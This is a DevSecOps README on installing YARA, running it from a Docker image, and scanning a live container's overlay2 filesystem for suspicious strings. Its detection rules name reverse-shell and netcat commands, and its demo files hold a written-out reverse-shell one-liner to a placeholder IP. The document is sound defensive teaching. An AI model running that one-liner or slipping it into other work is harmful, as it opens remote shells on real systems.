# YARA + Docker (DevSecOps) — Practical README

This README contains:
- Installing **YARA** on Ubuntu
- Building a **YARA scanner Docker image**
- **Method 1:** Run YARA in a container and scan a mounted host path
- **Method 2:** Scan a **running Docker container** filesystem (overlay2 `MergedDir`) with YARA

---

## 1) Install YARA on Ubuntu (server)

### Option A — From Ubuntu repository (recommended for most cases)

```bash
sudo apt update
sudo apt install -y yara
yara --version
```

### Option B — Build latest from source (advanced)

```bash
sudo apt update
sudo apt install -y   automake libtool make gcc pkg-config   libssl-dev libjansson-dev libmagic-dev git

git clone https://github.com/VirusTotal/yara.git
cd yara
./bootstrap.sh
./configure
make
sudo make install
sudo ldconfig
yara --version
```

---

## 2) Create a basic test rule (optional sanity check)

Create `test.yar`:

```bash
cat > test.yar <<'EOF'
rule Simple_Test
{
  strings:
    $a = "secret_key"
    $b = "password="

  condition:
    any of them
}
EOF
```

Create a sample file and scan it:

```bash
echo "my password=123456" > sample.txt
yara test.yar sample.txt
```

Expected output:

```
Simple_Test sample.txt
```

---

## 3) Build a YARA Scanner Docker Image

Create a directory structure:

```bash
mkdir -p yara-docker/rules
cd yara-docker
```

Create `Dockerfile`:

```bash
cat > Dockerfile <<'EOF'
FROM ubuntu:22.04

RUN apt-get update &&     apt-get install -y yara &&     rm -rf /var/lib/apt/lists/*

WORKDIR /scan
ENTRYPOINT ["yara"]
EOF
```

Build it:

```bash
docker build -t yara-scanner:local .
```

Verify:

```bash
docker run --rm yara-scanner:local --version
```

---

## 4) Method 1 — Use YARA *as a container* + Mount a Host Path (Recommended)

This method is great for DevSecOps pipelines and clean host setups:
- You keep rules on the host
- You mount the target path read-only
- You run YARA from the scanner container

### 4.1 Create a “realistic” rule (reverse shell + secrets)

Create `rules/container.yar`:

```bash
cat > rules/container.yar <<'EOF'
rule Suspicious_Strings
{
  meta:
    author = "devsecops"
    severity = "high"

  strings:
    $s1 = "password="
    $s2 = "bash -i >& /dev/tcp/"
    $s3 = "nc -e /bin/sh"

  condition:
    any of them
}
EOF
```

### 4.2 Create a test directory to scan

```bash
mkdir -p target
echo "hello world" > target/clean.txt
echo "bash -i >& /dev/tcp/1.2.3.4/4444" > target/backdoor.sh
```

### 4.3 Run YARA scanner container

```bash
docker run --rm   -v "$(pwd)/rules:/rules:ro"   -v "$(pwd)/target:/target:ro"   yara-scanner:local   -r /rules/container.yar /target
```

Expected output (example):

```
Suspicious_Strings /target/backdoor.sh
```

Useful flags:
- `-r` recursive scan
- `-s` show matching strings/offsets
- `-f` fast scan

Example with `-s`:

```bash
docker run --rm   -v "$(pwd)/rules:/rules:ro"   -v "$(pwd)/target:/target:ro"   yara-scanner:local   -s -r /rules/container.yar /target
```

---

## 5) Method 2 — Scan a *running Docker container* filesystem (overlay2 `MergedDir`) with YARA

This is a **real-world incident response style** check:
- Start a container
- (For demo) drop a suspicious file inside it
- Locate the container’s `MergedDir` path
- Scan the live filesystem

> ⚠️ Requires `sudo` because `/var/lib/docker/overlay2` is root-owned.

### 5.1 Run a demo container

```bash
docker run -dit --name yara-test alpine sh
```

### 5.2 Simulate a suspicious artifact inside the container

```bash
docker exec yara-test sh -c 'echo "bash -i >& /dev/tcp/1.2.3.4/4444" > /tmp/backdoor.sh'
```

### 5.3 Create a YARA rule on the host (or reuse your existing one)

Create `container-live.yar`:

```bash
cat > container-live.yar <<'EOF'
rule Docker_Reverse_Shell
{
  meta:
    author = "devsecops"
    severity = "critical"

  strings:
    $rev1 = "bash -i >& /dev/tcp/"
    $rev2 = "nc -e /bin/sh"

  condition:
    any of them
}
EOF
```

### 5.4 Find the container’s `MergedDir` path

```bash
docker inspect yara-test | grep -i MergedDir
```

Example output:

```
"MergedDir": "/var/lib/docker/overlay2/abcd1234.../merged",
```

Copy that path.

### 5.5 Scan the running container filesystem

Replace the example path below with your real `MergedDir`:

```bash
sudo yara -r container-live.yar /var/lib/docker/overlay2/abcd1234.../merged
```

Expected output (example):

```
Docker_Reverse_Shell /var/lib/docker/overlay2/abcd1234.../merged/tmp/backdoor.sh
```

### 5.6 Clean up and confirm no match

```bash
docker exec yara-test rm /tmp/backdoor.sh
sudo yara -r container-live.yar /var/lib/docker/overlay2/abcd1234.../merged
```

Expected:
- No output

### 5.7 Remove the demo container

```bash
docker rm -f yara-test
```

---

## Notes / Tips

- **YARA is pattern-based detection**, great for catching:
  - reverse shells
  - webshell strings
  - miners
  - suspicious scripts
  - known malware indicators

- For vulnerability scanning (CVE), use tools like **Trivy**. YARA is complementary.

- If you want to scan **all running containers**, you can iterate `docker ps -q` and `docker inspect` each `MergedDir`.

---

## Quick Troubleshooting

### “permission denied” when scanning overlay2
Use `sudo`:

```bash
sudo yara -r rule.yar /var/lib/docker/overlay2/.../merged
```

### No matches but you expected one
- Check the target file really contains the string
- Use `-s` to see matched strings/offsets
- Ensure your rule condition is correct

---

## License
Use freely in your labs / DevSecOps pipelines.
